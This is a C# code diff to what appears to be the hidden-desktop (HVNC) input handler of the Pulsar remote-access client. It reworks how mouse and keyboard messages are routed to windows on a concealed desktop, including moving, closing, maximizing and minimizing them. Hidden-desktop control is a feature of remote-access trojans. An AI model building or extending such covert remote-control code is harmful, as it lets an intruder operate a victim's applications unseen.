@@ -78,6 +78,32 @@ namespace Pulsar.Client.Helper.HVNC
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int RealGetWindowClass(IntPtr hwnd, [Out] StringBuilder pszType, int cchType);
 
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetWindow(IntPtr hWnd, uint uCmd);
+
+        [DllImport("user32.dll")]
+        private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);
+
+        [DllImport("user32.dll")]
+        private static extern bool IsWindowVisible(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        private static extern bool IsWindow(IntPtr hWnd);
+
+        [DllImport("user32.dll")]
+        private static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);
+
+        [DllImport("user32.dll")]
+        private static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
+        
+        [DllImport("user32.dll")]
+        private static extern bool GetClientRect(IntPtr hWnd, out RECT lpRect);
+        
+        [DllImport("user32.dll")]
+        private static extern IntPtr GetDesktopWindow();
+
+        private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);
+
         #endregion
 
         #region Constants
@@ -96,6 +122,13 @@ namespace Pulsar.Client.Helper.HVNC
         private const int WM_CLOSE = 0x0010;
         private const int WM_SYSCOMMAND = 0x0112;
         private const int WM_NCHITTEST = 0x0084;
+        private const int WM_RBUTTONUP = 0x0205;
+        private const int WM_RBUTTONDOWN = 0x0204;
+        private const int WM_DESTROY = 0x0002;
+
+        // Mouse button constants
+        private const int MK_LBUTTON = 0x0001;
+        private const int MK_RBUTTON = 0x0002;
 
         // System command constants
         private const int SC_MINIMIZE = 0xF020;
@@ -117,12 +150,17 @@ namespace Pulsar.Client.Helper.HVNC
         private const int HTMAXBUTTON = 9;
         private const int HTTRANSPARENT = -1;
 
+        // Window enumeration constants
+        private const uint GW_HWNDPREV = 3;
+        private const uint GW_HWNDNEXT = 2;
+
         // Miscellaneous constants
         private const int VK_RETURN = 0x0D;
         private const int MN_GETHMENU = 0x01E1;
         private const int BM_CLICK = 0x00F5;
         private const int MAX_PATH = 260;
         private const int SW_SHOWMAXIMIZED = 3;
+        private const int SW_RESTORE = 9;
 
         #endregion
 
@@ -133,6 +171,11 @@ namespace Pulsar.Client.Helper.HVNC
         private IntPtr resizeWindowHandle = IntPtr.Zero;
         private IntPtr resizeMoveType = IntPtr.Zero;
         private bool leftMouseDown;
+        private bool isMovingWindow = false;
+        private POINT lastClickCoords = new POINT { x = 0, y = 0 };
+        private POINT lastWindowDimensions = new POINT { x = 0, y = 0 };
+        private IntPtr windowToMove = IntPtr.Zero;
+        private IntPtr workingWindow = IntPtr.Zero;
         private static readonly object syncLock = new object();
 
         /// <summary>
@@ -196,6 +239,20 @@ namespace Pulsar.Client.Helper.HVNC
             return new IntPtr(highWord << 16 | (lowWord & 0xFFFF));
         }
 
+        /// <summary>
+        /// Calculates relative coordinates from screen to window
+        /// </summary>
+        private POINT ScreenToWindow(int screenX, int screenY, int windowX, int windowY, int windowWidth, int windowHeight)
+        {
+            int relativeX = screenX - windowX;
+            int relativeY = screenY - windowY;
+
+            if (relativeX >= 0 && relativeX < windowWidth && relativeY >= 0 && relativeY < windowHeight)
+                return new POINT { x = relativeX, y = relativeY };
+            else
+                return new POINT { x = -1, y = -1 };
+        }
+
         #endregion
 
         #region Input Processing
@@ -211,239 +268,130 @@ namespace Pulsar.Client.Helper.HVNC
             lock (syncLock)
             {
                 SetThreadDesktop(this.Desktop);
-                IntPtr windowHandle = IntPtr.Zero;
-                bool isMouseMessage = false;
-                POINT cursorPosition;
 
+                // Handle mouse messages
+                if (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP || 
+                    msg == WM_RBUTTONDOWN || msg == WM_RBUTTONUP || 
+                    msg == WM_MOUSEMOVE)
+                {
+                    int x = GetXCoordinate(lParam);
+                    int y = GetYCoordinate(lParam);
+                    POINT cursorPosition = new POINT { x = x, y = y };
+                    
+                    // Update last position for tracking
+                    if (msg != WM_MOUSEMOVE) 
+                    {
+                        lastPoint = cursorPosition;
+                    }
+                    
+                    bool isLeft = (msg == WM_LBUTTONDOWN || msg == WM_LBUTTONUP);
+                    bool isUp = (msg == WM_LBUTTONUP || msg == WM_RBUTTONUP);
+
+                    if (isMovingWindow && isUp && isLeft)
+                    {
+                        // If we were moving a window and now released the button, complete the move
+                        SetWindowPos(windowToMove, IntPtr.Zero, 
+                            x - lastClickCoords.x, 
+                            y - lastClickCoords.y,
+                            lastWindowDimensions.x, 
+                            lastWindowDimensions.y, 
+                            0);
+                        isMovingWindow = false;
+                    }
+
+                    // Get the window under the cursor
+                    IntPtr hwnd = WindowFromPoint(cursorPosition);
+                    workingWindow = hwnd;
+
+                    if (hwnd != IntPtr.Zero)
+                    {
+                        // Get window information
+                        RECT windowRect;
+                        GetWindowRect(hwnd, out windowRect);
+                        
+                        // Calculate window position and size
+                        int windowX = windowRect.left;
+                        int windowY = windowRect.top;
+                        int windowWidth = windowRect.right - windowRect.left;
+                        int windowHeight = windowRect.bottom - windowRect.top;
+                        
+                        // Calculate position relative to window
+                        POINT clickCoords = ScreenToWindow(x, y, windowX, windowY, windowWidth, windowHeight);
+                        
+                        // Get hit test result to determine what part of the window was clicked
+                        IntPtr hitTestResult = SendMessage(hwnd, WM_NCHITTEST, IntPtr.Zero, lParam);
+                        int hitTestResultInt = hitTestResult.ToInt32();
+
+                        if (hitTestResultInt == HTCLOSE && msg == WM_LBUTTONUP)
+                        {
+                            // Close button clicked
+                            Debug.WriteLine("Closing window");
+                            PostMessage(hwnd, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
+                            PostMessage(hwnd, WM_DESTROY, IntPtr.Zero, IntPtr.Zero);
+                        }
+                        else if (hitTestResultInt == HTCAPTION)
+                        {
+                            // Title bar clicked
+                            if (!isUp && isLeft && msg == WM_LBUTTONDOWN)
+                            {
+                                // Start window move operation
+                                lastClickCoords = clickCoords;
+                                lastWindowDimensions = new POINT { x = windowWidth, y = windowHeight };
+                                isMovingWindow = true;
+                                windowToMove = hwnd;
+                                Debug.WriteLine("Starting window move");
+                            }
+                        }
+                        else if (hitTestResultInt == HTMAXBUTTON && msg == WM_LBUTTONUP)
+                        {
+                            // Maximize/Restore button clicked
+                            WINDOWPLACEMENT windowPlacement = default;
+                            windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
+                            GetWindowPlacement(hwnd, ref windowPlacement);
+                            
+                            if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
+                            {
+                                Debug.WriteLine("Restoring window");
+                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
+                            }
+                            else
+                            {
+                                Debug.WriteLine("Maximizing window");
+                                PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
+                            }
+                        }
+                        else if (hitTestResultInt == HTMINBUTTON && msg == WM_LBUTTONUP)
+                        {
+                            // Minimize button clicked
+                            Debug.WriteLine("Minimizing window");
+                            PostMessage(hwnd, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
+                        }
+                        else
+                        {
+                            // Regular window area clicked - forward the mouse message
+                            IntPtr param = isLeft ? new IntPtr(MK_LBUTTON) : new IntPtr(MK_RBUTTON);
+                            IntPtr translatedLParam = MakeLParam(clickCoords.x, clickCoords.y);
+                            PostMessage(hwnd, msg, param, translatedLParam);
+                        }
+                    }
+                }
                 // Handle keyboard messages
                 if (msg == WM_KEYDOWN || msg == WM_KEYUP || msg == WM_CHAR)
                 {
-                    cursorPosition = this.lastPoint;
-                    windowHandle = WindowFromPoint(cursorPosition);
-                }
-                // Handle mouse messages
-                else
-                {
-                    isMouseMessage = true;
-                    cursorPosition.x = GetXCoordinate(lParam);
-                    cursorPosition.y = GetYCoordinate(lParam);
-                    POINT previousPoint = this.lastPoint;
-                    this.lastPoint = cursorPosition;
-                    windowHandle = WindowFromPoint(cursorPosition);
-
-                    if (msg == WM_LBUTTONUP)
+                    if (workingWindow != IntPtr.Zero)
                     {
-                        HandleLeftButtonUp(windowHandle, lParam, cursorPosition);
-                    }
-                    else if (msg == WM_LBUTTONDOWN)
-                    {
-                        if (HandleLeftButtonDown(windowHandle, cursorPosition))
+                        // Example: build appropriate lParam for key up with scan code
+                        IntPtr keyMapParam = IntPtr.Zero;
+                        if (msg == WM_KEYUP)
                         {
-                            return;
+                            int scanCode = wParam.ToInt32();
+                            keyMapParam = new IntPtr((scanCode << 16) | 0xC0000000);
                         }
-                    }
-                    else if (msg == WM_MOUSEMOVE && this.leftMouseDown)
-                    {
-                        if (HandleMouseDrag(windowHandle, lParam, previousPoint, cursorPosition))
-                        {
-                            return;
-                        }
+
+                        PostMessage(workingWindow, msg, wParam, keyMapParam);
                     }
                 }
-
-                // Find the actual child window that should receive the message
-                IntPtr childWindow = FindTargetChildWindow(windowHandle, ref cursorPosition);
-
-                // Update lParam with new coordinates if this is a mouse message
-                if (isMouseMessage)
-                {
-                    lParam = MakeLParam(cursorPosition.x, cursorPosition.y);
-                }
-
-                // Finally send the message to the target window
-                PostMessage(childWindow, msg, wParam, lParam);
             }
-        }
-
-        /// <summary>
-        /// Handles a left mouse button up event.
-        /// </summary>
-        private void HandleLeftButtonUp(IntPtr windowHandle, IntPtr lParam, POINT cursorPosition)
-        {
-            this.leftMouseDown = false;
-            int hitTestResult = SendMessage(windowHandle, WM_NCHITTEST, IntPtr.Zero, lParam).ToInt32();
-
-            // Check which window area was clicked
-            if (hitTestResult <= HTMAXBUTTON)
-            {
-                if (hitTestResult == HTTRANSPARENT)
-                {
-                    Debug.WriteLine("HTTRANSPARENT");
-                    SetWindowLong(windowHandle, GWL_STYLE, GetWindowLong(windowHandle, GWL_STYLE) | WS_DISABLED);
-                    SendMessage(windowHandle, WM_NCHITTEST, IntPtr.Zero, lParam);
-                }
-                else if (hitTestResult == HTMINBUTTON)
-                {
-                    Debug.WriteLine("Hit min button");
-                    PostMessage(windowHandle, WM_SYSCOMMAND, new IntPtr(SC_MINIMIZE), IntPtr.Zero);
-                }
-            }
-            else if (hitTestResult == HTCLOSE)
-            {
-                Debug.WriteLine("Hit close button");
-                PostMessage(windowHandle, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
-            }
-            else if (hitTestResult == HTMAXBUTTON)
-            {
-                WINDOWPLACEMENT windowPlacement = default;
-                windowPlacement.length = Marshal.SizeOf<WINDOWPLACEMENT>(windowPlacement);
-                GetWindowPlacement(windowHandle, ref windowPlacement);
-
-                if ((windowPlacement.flags & SW_SHOWMAXIMIZED) != 0)
-                {
-                    Debug.WriteLine("Hit restore button");
-                    PostMessage(windowHandle, WM_SYSCOMMAND, new IntPtr(SC_RESTORE), IntPtr.Zero);
-                }
-                else
-                {
-                    Debug.WriteLine("Hit maximize button");
-                    PostMessage(windowHandle, WM_SYSCOMMAND, new IntPtr(SC_MAXIMIZE), IntPtr.Zero);
-                }
-            }
-        }
-
-        /// <summary>
-        /// Handles a left mouse button down event.
-        /// </summary>
-        /// <returns>True if the event was fully handled and no further processing is needed.</returns>
-        private bool HandleLeftButtonDown(IntPtr windowHandle, POINT cursorPosition)
-        {
-            this.leftMouseDown = true;
-            this.resizeWindowHandle = IntPtr.Zero;
-
-            // Check if clicking on a button
-            IntPtr buttonHandle = FindWindow("Button", null);
-            RECT buttonRect;
-            GetWindowRect(buttonHandle, out buttonRect);
-            if (PtInRect(ref buttonRect, cursorPosition))
-            {
-                Debug.WriteLine("Hit button");
-                PostMessage(buttonHandle, BM_CLICK, IntPtr.Zero, IntPtr.Zero);
-                return true;
-            }
-
-            // Check if clicking on a menu item
-            StringBuilder className = new StringBuilder(MAX_PATH);
-            RealGetWindowClass(windowHandle, className, MAX_PATH);
-            if (className.ToString() == "#32768")
-            {
-                Debug.WriteLine("Hit menu");
-                IntPtr subMenu = GetSubMenu(windowHandle, 0);
-                int menuItemIndex = MenuItemFromPoint(IntPtr.Zero, subMenu, cursorPosition);
-                GetMenuItemID(subMenu, menuItemIndex);
-                PostMessage(windowHandle, MN_GETHMENU, new IntPtr(menuItemIndex), IntPtr.Zero);
-                PostMessage(windowHandle, WM_KEYDOWN, new IntPtr(VK_RETURN), IntPtr.Zero);
-                return true;
-            }
-
-            return false;
-        }
-
-        /// <summary>
-        /// Handles mouse drag operations (move/resize).
-        /// </summary>
-        /// <returns>True if the event was fully handled and no further processing is needed.</returns>
-        private bool HandleMouseDrag(IntPtr windowHandle, IntPtr lParam, POINT previousPoint, POINT currentPoint)
-        {
-            if (this.resizeWindowHandle == IntPtr.Zero)
-            {
-                Debug.WriteLine("Hit move window");
-                this.resizeMoveType = SendMessage(windowHandle, WM_NCHITTEST, IntPtr.Zero, lParam);
-            }
-            else
-            {
-                Debug.WriteLine("Move window");
-                windowHandle = this.resizeWindowHandle;
-            }
-
-            int deltaX = previousPoint.x - currentPoint.x;
-            int deltaY = previousPoint.y - currentPoint.y;
-
-            RECT windowRect;
-            GetWindowRect(windowHandle, out windowRect);
-            int left = windowRect.left;
-            int top = windowRect.top;
-            int width = windowRect.right - windowRect.left;
-            int height = windowRect.bottom - windowRect.top;
-
-            // Adjust window position/size based on hit test area
-            switch (this.resizeMoveType.ToInt32())
-            {
-                case HTCAPTION:
-                    left -= deltaX;
-                    top -= deltaY;
-                    break;
-                case HTLEFT:
-                    left -= deltaX;
-                    width += deltaX;
-                    break;
-                case HTRIGHT:
-                    width -= deltaX;
-                    break;
-                case HTTOP:
-                    top -= deltaY;
-                    height += deltaY;
-                    break;
-                case HTTOPLEFT:
-                    top -= deltaY;
-                    height += deltaY;
-                    left -= deltaX;
-                    width += deltaX;
-                    break;
-                case HTTOPRIGHT:
-                    top -= deltaY;
-                    height += deltaY;
-                    width -= deltaX;
-                    break;
-                case HTBOTTOM:
-                    height -= deltaY;
-                    break;
-                case HTBOTTOMLEFT:
-                    height -= deltaY;
-                    left -= deltaX;
-                    width += deltaX;
-                    break;
-                case HTBOTTOMRIGHT:
-                    height -= deltaY;
-                    width -= deltaX;
-                    break;
-                default:
-                    return false;
-            }
-
-            Debug.WriteLine($"Move window to {left} {top} {width} {height}");
-            MoveWindow(windowHandle, left, top, width, height, false);
-            this.resizeWindowHandle = windowHandle;
-            return true;
-        }
-
-        /// <summary>
-        /// Finds the target child window that should receive the input message.
-        /// </summary>
-        private IntPtr FindTargetChildWindow(IntPtr parentWindow, ref POINT point)
-        {
-            IntPtr childWindow = parentWindow;
-            IntPtr tempWindow;
-
-            do
-            {
-                tempWindow = childWindow;
-                ScreenToClient(tempWindow, ref point);
-                childWindow = ChildWindowFromPoint(tempWindow, point);
-            }
-            while (childWindow != IntPtr.Zero && childWindow != tempWindow);
-
-            return tempWindow;
         }
 
         #endregion
